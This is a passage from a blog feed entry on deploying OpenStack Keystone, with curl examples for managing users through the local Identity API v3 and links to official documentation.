class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">| python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡ºç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/users&quot;</span> \</span><br><span class="line">-H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">| python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/users&quot;</span> \</span><br><span class="line">-H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">-H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">-d <span class="string">&#x27;&#123;&quot;user&quot;: &#123;&quot;name&quot;: &quot;newuser&quot;, &quot;password&quot;: &quot;pwd&quot;&#125;&#125;&#x27;</span> \</span><br><span class="line">| python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># user_id</span></span><br><span class="line">curl -s \</span><br><span class="line">-H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line"><span class="string">&quot;http://localhost:5000/v3/users/629169d123244d269d8b39538fc8f872&quot;</span> \</span><br><span class="line">| python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼ˆè¿”å› 204ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># user_id</span></span><br><span class="line">curl -i \</span><br><span class="line">-H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">-H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">-d <span class="string">&#x27;&#123; &quot;user&quot;: &#123;&quot;password&quot;: &quot;password&quot;, &quot;original_password&quot;: &quot;pwd&quot;&#125; &#125;&#x27;</span> \</span><br><span class="line"><span class="string">&quot;http://localhost:5000/v3/users/629169d123244d269d8b39538fc8f872/password&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–°ç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># user_id</span></span><br><span class="line">curl -s -X PATCH \</span><br><span class="line">-H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">-H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">-d <span class="string">&#x27;&#123; &quot;user&quot;: &#123;&quot;password&quot;: &quot;pwd&quot;&#125; &#125;&#x27;</span> \</span><br><span class="line"><span class="string">&quot;http://localhost:5000/v3/users/629169d123244d269d8b39538fc8f872&quot;</span> \</span><br><span class="line">| python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ç”¨æˆ·ï¼ˆè¿”å› 204ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># user_id</span></span><br><span class="line">curl -i -X DELETE \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/users/629169d123244d269d8b39538fc8f872&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><p><a href="https://docs.openstack.org/keystone/latest/install/keystone-install-ubuntu.html#prerequisites">Install and configure</a></p></li><li><p><a href="https://docs.openstack.org/project-team-guide/project-setup/python.html">Python Project Guide</a></p></li><li><p><a href="https://docs.openstack.org/keystone/latest/contributor/set-up-keystone.html">Setting up Keystone</a></p></li><li><p><a href="https://kairen.gitbooks.io/openstack-ubuntu-newton/content/ubuntu-binary/keystone/">Keystone å®‰è£èˆ‡è¨­å®š</a></p></li><li><p><a href="https://docs.openstack.org/keystone/latest/api_curl_examples.html">API Examples using Curl</a></p></li><li><p><a href="https://docs.openstack.org/api-ref/identity/v3/">Identity API v3 (CURRENT)</a></p></li><li><p><a href="https://docs.openstack.org/keystone/victoria/getting-started/policy_mapping.html">Mapping of policy target to API</a></p></li></ul>]]></content>
    
    
    <summary type="html">è®°å½•éƒ¨ç½²æµç¨‹</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
</feed>
